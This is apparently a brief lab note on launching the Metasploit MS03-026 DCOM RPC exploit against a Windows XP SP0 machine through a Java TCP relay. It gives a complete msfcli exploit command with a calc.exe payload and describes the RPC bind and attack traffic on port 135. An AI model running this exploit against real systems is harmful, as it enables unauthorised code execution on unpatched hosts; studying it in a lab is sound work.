Had a Java written TCP sniff and relay program listening.


Target was WinXP 32-bit SP0 machine.

MS03-026 works nicely and much better than ms08-67


msfcli exploit/windows/dcerpc/ms03_026_dcom PAYLOAD=windows/exec CMD=C:\\\\Windows\\\\System32\\\\calc.exe RHOST=127.0.0.1 RPORT=60135 E

Noticer the rhost and rport settings to go to the relay


Basically sends RPC session bind, server returns info it is just ignored/not needed

Second transmission is the attack & payload.


All 1 TCP connection and session.  Port 135 TCP.
